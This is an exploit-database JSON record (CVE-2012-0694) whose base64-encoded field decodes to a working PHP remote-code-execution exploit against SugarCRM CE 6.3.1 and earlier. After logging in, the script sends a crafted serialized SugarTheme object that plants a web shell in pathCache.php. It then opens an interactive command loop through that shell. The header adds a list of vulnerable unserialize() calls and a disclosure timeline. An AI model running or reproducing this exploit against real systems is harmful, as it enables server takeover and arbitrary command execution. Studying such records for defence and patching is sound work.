{
    "source": "exploit-database", 
    "exploit": "PD9waHANCg0KLyoNCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAgU3VnYXJDUk0gQ0UgPD0gNi4zLjEgInVuc2VyaWFsaXplKCkiIFBIUCBDb2RlIEV4ZWN1dGlvbg0KICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICANCiAgICBhdXRob3IuLi4uLi4uLi4uLjogRWdpZGlvIFJvbWFubyBha2EgRWdpWA0KICAgIG1haWwuLi4uLi4uLi4uLi4uOiBuMGIwZDEzc1thdF1nbWFpbFtkb3RdY29tDQogICAgc29mdHdhcmUgbGluay4uLi46IGh0dHA6Ly93d3cuc3VnYXJjcm0uY29tLw0KICAgIA0KICAgICstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKw0KICAgIHwgVGhpcyBwcm9vZiBvZiBjb25jZXB0IGNvZGUgd2FzIHdyaXR0ZW4gZm9yIGVkdWNhdGlvbmFsIHB1cnBvc2Ugb25seS4gICAgfA0KICAgIHwgVXNlIGl0IGF0IHlvdXIgb3duIHJpc2suIEF1dGhvciB3aWxsIGJlIG5vdCByZXNwb25zaWJsZSBmb3IgYW55IGRhbWFnZS4gfA0KICAgICstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKw0KICAgIA0KICAgIFstXSBWdWxuZXJhYmxlIGNvZGUgaW4gZGlmZmVyZW50IGxvY2F0aW9uczoNCiAgICANCiAgICBpbmNsdWRlL2V4cG9ydF91dGlscy5waHA6Mzc3OiAgJHNlYXJjaEZvcm0tPnBvcHVsYXRlRnJvbUFycmF5KHVuc2VyaWFsaXplKGJhc2U2NF9kZWNvZGUoJHF1ZXJ5KSkpOw0KICAgIGluY2x1ZGUvZ2VuZXJpYy9TYXZlMi5waHA6MTk3OiAgJGN1cnJlbnRfcXVlcnlfYnlfcGFnZV9hcnJheSA9IHVuc2VyaWFsaXplKGJhc2U2NF9kZWNvZGUoJGN1cnJlbnRfcXVlcnlfYnlfcGFnZSkpOw0KICAgIGluY2x1ZGUvTVZDL0NvbnRyb2xsZXIvU3VnYXJDb250cm9sbGVyLnBocDo1OTM6ICAkX1JFUVVFU1QgPSB1bnNlcmlhbGl6ZShiYXNlNjRfZGVjb2RlKCR0ZW1wX3JlcVsnY3VycmVudF9xdWVyeV9ieV9wYWdlJ10pKTsNCiAgICBpbmNsdWRlL01WQy9WaWV3L3ZpZXdzL3ZpZXcubGlzdC5waHA6ODI6ICAkY3VycmVudF9xdWVyeV9ieV9wYWdlID0gdW5zZXJpYWxpemUoYmFzZTY0X2RlY29kZSgkX1JFUVVFU1RbJ2N1cnJlbnRfcXVlcnlfYnlfcGFnZSddKSk7DQogICAgbW9kdWxlcy9JbXBvcnQvSW1wb3J0ZXIucGhwOjUzNjogICRmaXJzdHJvdyAgICA9IHVuc2VyaWFsaXplKGJhc2U2NF9kZWNvZGUoJF9SRVFVRVNUWydmaXJzdHJvdyddKSk7DQogICAgbW9kdWxlcy9Qcm9qZWN0VGFzay92aWV3cy92aWV3Lmxpc3QucGhwOjk1OiAgJGN1cnJlbnRfcXVlcnlfYnlfcGFnZSA9IHVuc2VyaWFsaXplKGJhc2U2NF9kZWNvZGUoJF9SRVFVRVNUWydjdXJyZW50X3F1ZXJ5X2J5X3BhZ2UnXSkpOw0KICAgIA0KICAgIFRoZSB2dWxuZXJhYmlsaXR5ICBpcyAgY2F1c2VkICBkdWUgdG8gIGFsbCB0aGVzZSBzY3JpcHRzIHVzaW5nICJ1bnNlcmlhbGl6ZSgpIiB3aXRoIHVzZXIgIGNvbnRyb2xsZWQgaW5wdXQuDQogICAgVGhpcyBjYW4gYmUgZXhwbG9pdGVkIHRvIGUuZy4gZXhlY3V0ZSBhcmJpdHJhcnkgUEhQIGNvZGUgdmlhIHRoZSAgIl9fZGVzdHJ1Y3QoKSIgbWV0aG9kIG9mIHRoZSAiU3VnYXJUaGVtZSINCiAgICBjbGFzcywgcGFzc2luZyBhbiAgYWQtaG9jICBzZXJpYWxpemVkIG9iamVjdCB0aHJvdWdoIHRoZSAkX1JFUVVFU1RbJ2N1cnJlbnRfcXVlcnlfYnlfcGFnZSddIGlucHV0IHZhcmlhYmxlLg0KDQogICAgWy1dIERpc2Nsb3N1cmUgdGltZWxpbmU6DQogICAgDQogICAgWzMxLzEwLzIwMTFdIC0gVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcmVkDQogICAgWzA1LzExLzIwMTFdIC0gVmVuZG9yIG5vdGlmaWVkIHRvIHNlY3VyZShhdClzdWdhcmNybS5jb20NCiAgICBbMjUvMTEvMjAxMV0gLSBWZW5kb3Igbm90aWZpZWQgdG8gaHR0cDovL3d3dy5zdWdhcmNybS5jb20vZm9ydW1zL2YyMi9jcml0aWNhbC1zZWN1cml0eS12dWxuZXJhYmlsaXR5LTc2NTM3Lw0KICAgIFswNy8xMi8yMDExXSAtIFZlbmRvciBmaXggdGhlIGlzc3VlIG9uIGhpcyBvd24gd2l0aGluIDYuNC4wIFJDMSByZWxlYXNlDQogICAgWzEwLzAxLzIwMTJdIC0gQ1ZFIG51bWJlciByZXF1ZXN0ZWQNCiAgICBbMTIvMDEvMjAxMl0gLSBBc3NpZ25lZCBDVkUtMjAxMi0wNjk0DQogICAgWzA2LzAyLzIwMTJdIC0gSXNzdWUgYWRkcmVzc2VkIHdpdGhpbiA2LjQuMCB2ZXJzaW9uDQogICAgWzIzLzA2LzIwMTJdIC0gUHVibGljIGRpc2Nsb3N1cmUNCiAgICANCiovDQoNCmVycm9yX3JlcG9ydGluZygwKTsNCnNldF90aW1lX2xpbWl0KDApOw0KaW5pX3NldCgiZGVmYXVsdF9zb2NrZXRfdGltZW91dCIsIDUpOw0KDQpmdW5jdGlvbiBodHRwX3NlbmQoJGhvc3QsICRwYWNrZXQpDQp7DQogICAgaWYgKCEoJHNvY2sgPSBmc29ja29wZW4oJGhvc3QsIDgwKSkpIGRpZSgiXG5bLV0gTm8gcmVzcG9uc2UgZnJvbSB7JGhvc3R9OjgwXG4iKTsNCiAgICBmcHV0cygkc29jaywgJHBhY2tldCk7DQogICAgcmV0dXJuIHN0cmVhbV9nZXRfY29udGVudHMoJHNvY2spOw0KfQ0KDQpwcmludCAiXG4rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyI7DQpwcmludCAiXG58IFN1Z2FyQ1JNIENFIDw9IDYuMy4xIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiBFeHBsb2l0IGJ5IEVnaVggfCI7DQpwcmludCAiXG4rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tK1xuIjsNCg0KaWYgKCRhcmdjIDwgNSkNCnsNCiAgICBwcmludCAiXG5Vc2FnZS4uLi4uLjogcGhwICRhcmd2WzBdIDxob3N0PiA8cGF0aD4gPHVzZXJuYW1lPiA8cGFzc3dvcmQ+XG4iOw0KICAgIHByaW50ICJcbkV4YW1wbGUuLi4uOiBwaHAgJGFyZ3ZbMF0gbG9jYWxob3N0IC8gc2FyYWggc2FyYWgiOw0KICAgIHByaW50ICJcbkV4YW1wbGUuLi4uOiBwaHAgJGFyZ3ZbMF0gbG9jYWxob3N0IC9zdWdhcmNybS8gamltIGppbVxuIjsNCiAgICBkaWUoKTsNCn0NCg0KbGlzdCgkaG9zdCwgJHBhdGgpID0gYXJyYXkoJGFyZ3ZbMV0sICRhcmd2WzJdKTsNCg0KJHBheWxvYWQgPSAibW9kdWxlPVVzZXJzJmFjdGlvbj1BdXRoZW50aWNhdGUmdXNlcl9uYW1lPXskYXJndlszXX0mdXNlcl9wYXNzd29yZD17JGFyZ3ZbNF19IjsNCiRwYWNrZXQgID0gIlBPU1QgeyRwYXRofWluZGV4LnBocCBIVFRQLzEuMFxyXG4iOw0KJHBhY2tldCAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHBhY2tldCAuPSAiQ29va2llOiBQSFBTRVNTSUQ9MVxyXG4iOw0KJHBhY2tldCAuPSAiQ29udGVudC1MZW5ndGg6ICIuc3RybGVuKCRwYXlsb2FkKS4iXHJcbiI7DQokcGFja2V0IC49ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG4iOw0KJHBhY2tldCAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbnskcGF5bG9hZH0iOw0KDQokbG9naW4gPSBodHRwX3NlbmQoJGhvc3QsICRwYWNrZXQpOw0KDQppZiAocHJlZ19tYXRjaCgiL2FjdGlvbj1Mb2dpbi8iLCAkbG9naW4pKSBkaWUoIlxuWy1dIExvZ2luIGZhaWxlZCFcbiIpOw0KaWYgKCFwcmVnX21hdGNoKCIvU2V0LUNvb2tpZTogKC4qKSBwYXRoLyIsICRsb2dpbiwgJHNpZCkpIGRpZSgiXG5bLV0gU2Vzc2lvbiBJRCBub3QgZm91bmQhXG4iKTsNCg0KY2xhc3MgU3VnYXJUaGVtZQ0Kew0KICAgIHByb3RlY3RlZCAkZGlyTmFtZSA9ICcuLi8uLic7DQogICAgcHJpdmF0ZSAgICRfanNDYWNoZSA9ICc8P3BocCBlcnJvcl9yZXBvcnRpbmcoMCk7cGFzc3RocnUoYmFzZTY0X2RlY29kZSgkX1NFUlZFUltIVFRQX0NNRF0pKTsgPz4nOw0KfQ0KDQokcGF5bG9hZCA9ICJtb2R1bGU9Q29udGFjdHMmQ29udGFjdHMyX0NPTlRBQ1Rfb2Zmc2V0PTEmY3VycmVudF9xdWVyeV9ieV9wYWdlPSIuYmFzZTY0X2VuY29kZShzZXJpYWxpemUobmV3IFN1Z2FyVGhlbWUpKTsNCiRwYWNrZXQgID0gIlBPU1QgeyRwYXRofWluZGV4LnBocCBIVFRQLzEuMFxyXG4iOw0KJHBhY2tldCAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHBhY2tldCAuPSAiQ29va2llOiB7JHNpZFsxXX1cclxuIjsNCiRwYWNrZXQgLj0gIkNvbnRlbnQtTGVuZ3RoOiAiLnN0cmxlbigkcGF5bG9hZCkuIlxyXG4iOw0KJHBhY2tldCAuPSAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuIjsNCiRwYWNrZXQgLj0gIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG57JHBheWxvYWR9IjsNCg0KaHR0cF9zZW5kKCRob3N0LCAkcGFja2V0KTsNCg0KJHBhY2tldCAgPSAiR0VUIHskcGF0aH1wYXRoQ2FjaGUucGhwIEhUVFAvMS4wXHJcbiI7DQokcGFja2V0IC49ICJIb3N0OiB7JGhvc3R9XHJcbiI7DQokcGFja2V0IC49ICJDbWQ6ICVzXHJcbiI7DQokcGFja2V0IC49ICJDb25uZWN0aW9uOiBjbG9zZVxyXG5cclxuIjsNCg0Kd2hpbGUoMSkNCnsNCiAgICBwcmludCAiXG5zdWdhci1zaGVsbCMgIjsNCiAgICBpZiAoKCRjbWQgPSB0cmltKGZnZXRzKFNURElOKSkpID09ICJleGl0IikgYnJlYWs7DQogICAgJHJlc3BvbnNlID0gaHR0cF9zZW5kKCRob3N0LCBzcHJpbnRmKCRwYWNrZXQsIGJhc2U2NF9lbmNvZGUoJGNtZCkpKTsNCiAgICBwcmVnX21hdGNoKCcvczo3MjoiKC4qKSI7czo4L3MnLCAkcmVzcG9uc2UsICRtKSA/IHByaW50ICRtWzFdIDogZGllKCJcblstXSBFeHBsb2l0IGZhaWxlZCFcbiIpOw0KfQ==", 
    "filename": "platforms/php/webapps/19381.php", 
    "id": "19381", 
    "cves": [
        "CVE-2012-0694"
    ]
}